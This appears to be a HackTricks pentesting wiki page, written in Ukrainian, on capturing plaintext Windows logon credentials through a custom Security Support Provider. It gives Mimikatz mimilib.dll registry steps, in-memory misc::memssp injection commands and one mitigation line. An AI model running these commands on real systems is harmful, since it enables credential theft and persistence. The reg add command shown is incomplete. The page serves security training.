# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Дізнайтеся, що таке SSP (Security Support Provider) тут.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Ви можете створити **свій власний SSP**, щоб **захоплювати** **в чистому вигляді** **облікові дані**, які використовуються для доступу до машини.

#### Mimilib

Ви можете використовувати бінарний файл `mimilib.dll`, наданий Mimikatz. **Це буде записувати в файл всі облікові дані в чистому вигляді.**\
Скиньте dll у `C:\Windows\System32\`\
Отримайте список існуючих LSA Security Packages:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Додайте `mimilib.dll` до списку постачальників підтримки безпеки (Security Packages):
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
І після перезавантаження всі облікові дані можна знайти у відкритому вигляді в `C:\Windows\System32\kiwissp.log`

#### У пам'яті

Ви також можете безпосередньо впровадити це в пам'ять, використовуючи Mimikatz (зверніть увагу, що це може бути трохи нестабільно/не працювати):
```bash
privilege::debug
misc::memssp
```
Це не переживе перезавантаження.

#### Пом'якшення

ID події 4657 - Аудит створення/зміни `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
